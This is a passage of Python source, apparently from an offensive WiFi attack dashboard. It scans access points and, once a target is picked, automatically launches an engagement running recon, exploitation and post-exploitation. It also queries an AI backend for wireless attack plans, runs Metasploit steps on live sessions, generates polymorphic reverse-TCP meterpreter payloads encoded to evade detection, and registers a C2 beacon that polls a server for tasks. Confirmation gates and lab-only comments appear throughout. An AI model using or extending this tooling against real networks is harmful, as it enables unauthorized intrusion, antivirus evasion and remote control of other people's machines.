        terminal (xterm/gnome-terminal/…). Arrows move, SPACE/ENTER
        select, **A** queues AIO ATTACK. Fallback: in-process enhanced
        scanner + numbered targets view (tests inject ``scanner_cls``).
        """
        # Tests: injected scanner_cls → hermetic in-process path (no auto
        # iface pick, no external terminal).
        if self.scanner_cls is not None:
            if not getattr(self, "interface", None):
                self.activity_log.append(
                    "[!] No interface selected — pick one first "
                    "(Advanced → Pick Interface)."
                )
                return
            return self._scan_networks_inprocess()

        if not getattr(self, "interface", None):
            # Prefer an interface already in monitor mode, then mt7921e.
            try:
                from core.scanners.wifi_radio import pick_best_scan_iface
                best = pick_best_scan_iface(None)
                if best:
                    self.interface = best
                    self.activity_log.append(
                        f"[+] Auto-selected {self.interface} for scan"
                    )
            except Exception:
                pass
            if not getattr(self, "interface", None):
                try:
                    from core.modules.mt7921e_tools import detect_mt7921e_interfaces
                    found = detect_mt7921e_interfaces()
                    if found:
                        self.interface = found[0].name
                        self.activity_log.append(
                            f"[+] Auto-selected {self.interface} for scan"
                        )
                except Exception:
                    pass
        if not getattr(self, "interface", None):
            self.activity_log.append(
                "[!] No interface selected — pick one first "
                "(Advanced → Pick Interface)."
            )
            return

        # Prefer actual monitor-mode VIF when the selected name is managed
        # (e.g. operator picked wlan0 but airmon already created wlan0mon).
        try:
            from core.scanners.wifi_radio import pick_best_scan_iface, iface_mode
            if iface_mode(self.interface) != "monitor":
                alt = pick_best_scan_iface(self.interface)
                if alt and alt != self.interface and iface_mode(alt) == "monitor":
                    self.activity_log.append(
                        f"[i] {self.interface} is not monitor; using {alt}"
                    )
                    self.interface = alt
        except Exception:
            pass

        out_path = "logs/wifi_scan_selection.json"
        try:
            from pathlib import Path as _P
            _P("logs").mkdir(parents=True, exist_ok=True)
            p = _P(out_path)
            if p.is_file():
                p.unlink()
        except Exception:
            pass

        # Prefer triple external windows: UL=online APs, UR=clients, BR=offline.
        try:
            from core.tui import wifi_scan_bus as scan_bus
            from core.utils.external_terminal import get_scan_font_scale
            sm = getattr(self, "settings_manager", None)
            trip = scan_bus.launch_triple_wifi_windows(
                str(self.interface),
                settings=sm,
                font_scale=get_scan_font_scale(sm),
            )
            bus_dir = trip.get("bus_dir")
            n_ok = sum(
                1 for k in ("topleft", "topright", "bottomright")
                if trip.get("procs", {}).get(k) is not None
            )
            if bus_dir and n_ok > 0:
                self.activity_log.append(
                    f"[+] Triple scan windows on {self.interface} "
                    f"({n_ok}/3) bus={bus_dir}"
                )
                self.activity_log.append(
                    "[*] UL: APs live ↑↓ ENTER/SPACE select · "
                    "UR: clients of focus · BR: offline + timestamps · Ctrl+C quit"
                )
                self.activity_log.append(
                    "[*] Selecting an AP starts engagement automatically "
                    "(recon→CVE→plan→attack→post)."
                )

                def _wait_triple():
                    import json
                    from pathlib import Path
                    sel = scan_bus.wait_for_selection(
                        Path(bus_dir), timeout_s=600.0
                    )
                    if not sel:
                        self.activity_log.append(
                            "[i] No AP selected (quit/timeout) — "
                            "use Scan again or Advanced."
                        )
                        return
                    sel = dict(sel)
                    sel["from_external_scan"] = True
                    sel["interface"] = self.interface
                    self.selected_target = sel
                    # Mirror into legacy path for AIO loaders
                    try:
                        Path("logs").mkdir(parents=True, exist_ok=True)
                        Path(out_path).write_text(
                            json.dumps({
                                "selected": sel,
                                "aio_attack": True,
                                "networks": [sel],
                                "ts": __import__("time").time(),
                            }, ensure_ascii=False, default=str),
                            encoding="utf-8",
                        )
                    except Exception:
                        pass
                    self.activity_log.append(
                        f"[+] Selected AP: {sel.get('ssid') or '<hidden>'} "
                        f"[{sel.get('bssid')}] — starting engagement"
                    )
                    self.aio_attack()

                self._spawn(_wait_triple)
                return
            for k, v in (trip.get("procs") or {}).items():
                if k.endswith("_error"):
                    self.activity_log.append(f"[i] window {k}: {v}")
        except Exception as e:
            self.activity_log.append(f"[i] Triple scan launch: {e}")

        # Fallback: single external wifi_scan_external window
        from core.utils.external_terminal import get_scan_font_scale
        cmd_argv = [
            sys.executable, "-m", "core.tui.wifi_scan_external",
            "--iface", str(self.interface),
            "--out", out_path,
            "--seconds", "30",
            "--long-range",
        ]
        log_path = "logs/steps/wifi_scan_external.log"
        launched = False
        if self.external_terminal is not None:
            try:
                launch = getattr(
                    self.external_terminal, "launch_script_in_project_root", None
                )
                if callable(launch):
                    sm = getattr(self, "settings_manager", None)
                    launch(
                        cmd_argv,
                        log_path,
                        title=f"KFIOSA WiFi Scan — {self.interface}",
                        font_scale=get_scan_font_scale(sm),
                        position="topleft",
                    )
                    launched = True
            except Exception as e:
                self.activity_log.append(f"[i] External terminal launch: {e}")

        if launched:
            self.activity_log.append(
                f"[+] External scan window opened on {self.interface}. "
                "Use ↑↓, SPACE/ENTER to select, A for AIO engagement, q when done."
            )

            def _wait_selection():
                import time
                from pathlib import Path
                deadline = time.time() + 180
                while time.time() < deadline:
                    if Path(out_path).is_file():
                        time.sleep(0.5)
                        if self._load_external_scan_selection():
                            try:
                                import json
                                data = json.loads(
                                    Path(out_path).read_text(encoding="utf-8")
                                )
                                if data.get("aio_attack") or data.get("selected"):
                                    self.activity_log.append(
                                        "[AIO] Selection → engagement"
                                    )
                                    self.aio_attack()
                            except Exception:
                                pass
                        return
                    time.sleep(1.0)
                self.activity_log.append(
                    "[i] No external selection yet — press ▶ Start engagement after picking."
                )
            self._spawn(_wait_selection)
            return

        self.activity_log.append(
            "[i] No external terminal — falling back to in-dashboard scan."
        )
        self._scan_networks_inprocess()

    def _scan_networks_inprocess(self):
        """Original in-dashboard scan (also used by pytest via scanner_cls)."""
        try:
            from core.scanners.scan_limits import wifi_scan_s, DEFAULT_WIFI_SCAN_S
            _scan_s = wifi_scan_s(None)
        except Exception:
            _scan_s = 300
            DEFAULT_WIFI_SCAN_S = 300
        self.activity_log.append(
            f"[*] Starting long-range WiFi scan on {self.interface} "
            f"({_scan_s}s multi-band hop; override KFIOSA_WIFI_SCAN_S)..."
        )

        def run_scan():
            try:
                scanner_cls = self.scanner_cls
                if scanner_cls is not None:
                    scanner = scanner_cls()
                else:
                    from core.scanners.enhanced_wifi_scanner import EnhancedWiFiScanner
                    scanner = EnhancedWiFiScanner()
                if hasattr(scanner, "initialize"):
                    scanner.initialize()

                self.activity_log.append(
                    "[*] Scanning 2.4+5 GHz (full hop, long dwell)..."
                )
                scan_data = scanner.scan(self.interface, timeout=_scan_s)
                networks = scan_data.get("networks", [])
                error = scan_data.get("error")

                if error:
                    self.activity_log.append(f"[!] Scan error: {error}")
                if not networks:
                    if not error:
                        self.activity_log.append(
                            "[i] No networks discovered on this interface."
                        )
                    self.scan_results = []
                    self.targets = []
                    return

                self.scan_results = networks
                self.targets = list(networks)
                self.activity_log.append(
                    f"[+] WiFi scan completed: {len(self.scan_results)} APs found"
                )
                for net in self.scan_results:
                    self.activity_log.append(
                        f"[i] SSID: {net.get('ssid')} | BSSID: {net.get('bssid')} "
                        f"| CH: {net.get('channel')} | Enc: {net.get('encryption')}"
                    )
                self._enter_targets_view()
            except Exception as e:
                logger.error(f"WiFi scan error: {e}")
                self.activity_log.append(f"[!] Scan error: {e}")
                self.scan_results = []
                self.targets = []

        self._spawn(run_scan)

    # ------------------------------------------------------------------
    # Advanced actions
    # ------------------------------------------------------------------
    def generate_attack_plan(self):
        """Invoke AI backend to recommend attack strategy for the selected AP."""
        if not self.selected_target:
            self.activity_log.append("[!] Please select a target first.")
            return

        self.activity_log.append(f"[*] Querying AI for target {self.selected_target.get('ssid')}...")

        # Retrieve relevant exploit repos from knowledge base
        cves = self.kb.search(self.selected_target.get("encryption"), limit=3)
        context = {
            "target": self.selected_target,
            "matching_exploits": [c.get("repo_name") for c in cves]
        }

        def run_ai():
            prompt = f"Recommend a detailed, step-by-step wireless penetration testing methodology for target AP with SSID {self.selected_target.get('ssid')}, encryption {self.selected_target.get('encryption')}, channel {self.selected_target.get('channel')}, and vendor {self.selected_target.get('vendor')}."
            ai_plan = self.ai_backend.query("wifi", prompt, context)

            self.activity_log.append("=== AI Wireless Attack Plan ===")
            for line in ai_plan.split("\n"):
                if line.strip():
                    self.activity_log.append(line)

        self._spawn(run_ai)

    def plan_post_exploit(self):
        """Build a real AI plan + KB tools (+ optional MSF plan). No execution.

        MSF execution needs a REAL live session (a meterpreter foothold from
        a real exploit). The operator is prompted for the session id; if none
        is given, only the AI/KB plan is produced (no synthetic session).
        """
        if not self.selected_target:
            self.activity_log.append("[!] Select a target first.")
            return
        if not self.post_runner:
            self.activity_log.append("[!] Post-exploit runner unavailable.")
            return
        session_id = self.get_input("Live MSF session id (blank = plan only, no execution)")
        session = None
        if session_id and session_id.strip():
            session = {"id": session_id.strip(), "os": "linux", "type": "post"}
        self.activity_log.append("[*] Planning post-exploit (AI + KB + MSF)...")
        target = dict(self.selected_target)
        target.setdefault("interface", self.interface)

        def run():
            plan = self.post_runner.plan("wifi", target, session=session)
            self._post_plan = plan
            if plan.get("error") and not plan.get("ai_plan"):
                self.activity_log.append(f"[!] {plan['error']}")
            if plan.get("ai_plan"):
                self.activity_log.append("=== AI Post-Exploit Plan ===")
                for line in plan["ai_plan"].splitlines():
                    if line.strip():
                        self.activity_log.append(line)
            if plan.get("kb_tools"):
                self.activity_log.append(
                    f"[i] KB tools ({len(plan['kb_tools'])}): "
                    + ", ".join(t.get("repo_name", "") for t in plan["kb_tools"][:6])
                )
            if plan.get("msf_plan") and plan["msf_plan"].get("steps"):
                self.activity_log.append(
                    f"[+] MSF plan: {len(plan['msf_plan']['steps'])} steps "
                    "(execute via Advanced → Post-Exploit Execute)."
                )
            else:
                self.activity_log.append(
                    "[i] No executable MSF steps (provide a real live session id "
                    "to build gated msf steps)."
                )

        self._spawn(run)

    def execute_post_exploit(self):
        """Execute the last MSF plan step-by-step, each gated (default-deny)."""
        if not self.post_runner:
            self.activity_log.append("[!] Post-exploit runner unavailable.")
            return
        if not self._post_plan or not self._post_plan.get("msf_plan"):
            self.activity_log.append(
                "[!] No MSF plan to execute — run 'Post-Exploit Plan' first "
                "(requires a session)."
            )
            return
        self.activity_log.append("[*] Executing MSF plan — each step prompts ACCEPT/CANCEL...")

        def run():
            results = self.post_runner.execute(self._post_plan)
            for r in results:
                self.activity_log.append(f"[i] step: {r}")

        self._spawn(run)

    def show_kb_tools(self):
        """Surface relevant WiFi/exploit repos from the knowledge base."""
        if not self.kb:
            self.activity_log.append("[!] KB unavailable.")
            return
        tools = self.kb.get_tools_for_domain("wifi")
        self.activity_log.append(f"[+] KB WiFi tools ({len(tools)}):")
        for t in tools[:15]:
            self.render_kb_tool(t)

    def launch_metasploit_exploit(self):
        """Generate a polymorphic payload via the real, gated MSF driver."""
        if not self.selected_target:
            self.activity_log.append("[!] Please select a target first.")
            return
        if not self.post_runner:
            self.activity_log.append("[!] Post-exploit runner unavailable.")
            return

        lhost = self.get_input("Listener LHOST (e.g. 10.0.0.5)") or "127.0.0.1"
        lport = self.get_input("Listener LPORT (e.g. 4444)") or "4444"
        self.activity_log.append(
            f"[*] Generating polymorphic payload (lhost={lhost} lport={lport})..."
        )

        def run():
            try:
                res = self.post_runner.generate_payload(
                    "windows/meterpreter/reverse_tcp", lhost, int(lport),
                    encoder="x86/shikata_ga_nai", iterations=5, fmt="raw",
                    use_polymorphic=True,
                )
                if res.get("error"):
                    self.activity_log.append(f"[!] {res['error']}")
                    return
                self.activity_log.append(
                    f"[+] Base payload: {res.get('base_len', 0)} raw bytes "
                    f"(encoder={res.get('encoder')}, iters={res.get('iterations')})."
                )
                if res.get("mutated") is not None:
                    self.activity_log.append(
                        f"[+] Polymorphic mutation: {len(res['mutated'])} bytes "
                        f"(techniques: {', '.join(res.get('techniques') or [])})."
                    )
            except Exception as e:
                logger.error(f"payload gen error: {e}")
                self.activity_log.append(f"[!] Payload generation failed: {e}")

        self._spawn(run)

    def establish_c2_beacon(self):
        """Establish a real lab C2 beacon (authorized-lab only), gated."""
        if not self.tui_confirm:
            self.activity_log.append("[!] ACCEPT/CANCEL gate unavailable.")
            return
        server = self.get_input("C2 server host (e.g. 127.0.0.1)") or "127.0.0.1"
        port = self.get_input("C2 server port (e.g. 8443)") or "8443"
        try:
            port_i = int(port)
        except ValueError:
            self.activity_log.append(f"[!] Invalid port: {port}")
            return
        self.activity_log.append(
            f"[*] Establishing lab C2 beacon -> {server}:{port_i} (each step gated)..."
        )

        def run():
            try:
                from core.c2.lab_beacon import LabBeacon
                beacon = LabBeacon(server=server, port=port_i, protocol="http",
                                   confirm_fn=self.tui_confirm.confirm)
                reg = beacon.register()
                if reg.get("error") or reg.get("status"):
                    self.activity_log.append(
                        f"[!] Beacon register: {reg.get('error') or reg.get('status')}"
                    )
                    return
                self.activity_log.append(
                    f"[+] Beacon registered (id={beacon.beacon_id}); polling for tasks."
                )
                beacon.run(on_task=lambda t: self.activity_log.append(
                    f"[+] Beacon task received: {t}"))
            except Exception as e:
                logger.error(f"c2 beacon error: {e}")
                self.activity_log.append(f"[!] C2 beacon failed: {e}")

        self._spawn(run)